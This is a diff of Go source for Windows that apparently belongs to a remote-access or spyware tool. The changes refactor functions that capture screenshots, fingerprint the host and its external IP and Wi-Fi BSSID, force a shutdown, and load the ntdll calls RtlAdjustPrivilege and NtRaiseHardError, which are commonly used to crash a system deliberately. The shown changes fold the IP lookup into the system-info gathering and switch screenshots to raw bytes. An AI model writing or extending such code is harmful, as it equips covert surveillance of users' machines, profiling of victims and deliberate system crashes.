@@ -1,7 +1,6 @@
 package main
 
 import (
-	"encoding/base64"
 	"fmt"
 	"github.com/shirou/gopsutil/cpu"
 	"github.com/shirou/gopsutil/disk"
@@ -15,11 +14,11 @@ import (
 	"os"
 	"os/exec"
 	"regexp"
-	"strings"
 	"unsafe"
 )
 
 type SysInfo struct {
+	IP       string
 	Hostname string
 	Platform string
 	CPU      string
@@ -28,8 +27,7 @@ type SysInfo struct {
 }
 
 var (
-	ntdll = syscall.NewLazyDLL("ntdll.dll")
-
+	ntdll              = syscall.NewLazyDLL("ntdll.dll")
 	RtlAdjustPrivilege = ntdll.NewProc("RtlAdjustPrivilege")
 	NtRaiseHardError   = ntdll.NewProc("NtRaiseHardError")
 )
@@ -82,7 +80,7 @@ func ForceShutdown() {
 	}
 }
 
-func GetScreenShot() string {
+func GetScreenShot() []byte {
 	if _, err := os.Stat(TEMPFILEDIR); os.IsNotExist(err) {
 		os.MkdirAll(TEMPFILEDIR, 0700)
 	}
@@ -103,7 +101,7 @@ func GetScreenShot() string {
 
 	data, _ := os.ReadFile(TEMPFILEDIR + "\\CAPTURE.png")
 
-	return strings.ReplaceAll(base64.StdEncoding.EncodeToString([]byte(data)), "=", "")
+	return data
 }
 
 func GetSysInfo() *SysInfo {
@@ -114,6 +112,11 @@ func GetSysInfo() *SysInfo {
 
 	System := new(SysInfo)
 
+	resp, _ := http.Get("https://myexternalip.com/raw")
+	defer resp.Body.Close()
+	body, _ := io.ReadAll(resp.Body)
+
+	System.IP = string(body)
 	System.Hostname = hostStat.Hostname
 	System.CPU = cpuStat[0].ModelName
 	System.Platform = hostStat.Platform
@@ -121,14 +124,6 @@ func GetSysInfo() *SysInfo {
 	System.Disk = diskStat.Total / 1024 / 1024
 
 	return System
-}
-
-func GetExternIP() string {
-	resp, _ := http.Get("https://myexternalip.com/raw")
-	defer resp.Body.Close()
-	body, _ := io.ReadAll(resp.Body)
-
-	return string(body)
 }
 
 func GetBSSID() string {
